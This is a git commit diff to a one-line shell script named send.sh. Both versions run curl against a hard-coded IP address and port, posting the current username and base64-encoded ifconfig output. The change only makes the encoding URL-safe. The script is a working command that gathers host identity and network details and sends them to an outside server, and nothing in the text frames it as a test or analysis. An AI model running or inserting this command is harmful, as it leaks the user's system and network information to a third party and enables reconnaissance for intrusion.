450cd3f9cdb34060b2b9e5bf47ac28bde36030fe
matthewpipie <matthewpipie@gmail.com>
2017-03-30 22:55:32 -0500

    Update send.sh

--- send.sh
+++ send.sh
@@ -1,1 +1,1 @@
-curl "73.76.175.200:23232" -d "whoami=$(whoami)&ifconfig=$(ifconfig | base64 -w 0)"
+curl "73.76.175.200:23232" -d "whoami=$(whoami)&ifconfig=$(ifconfig | base64 -w 0 | tr -- '+=/' '-_~')"
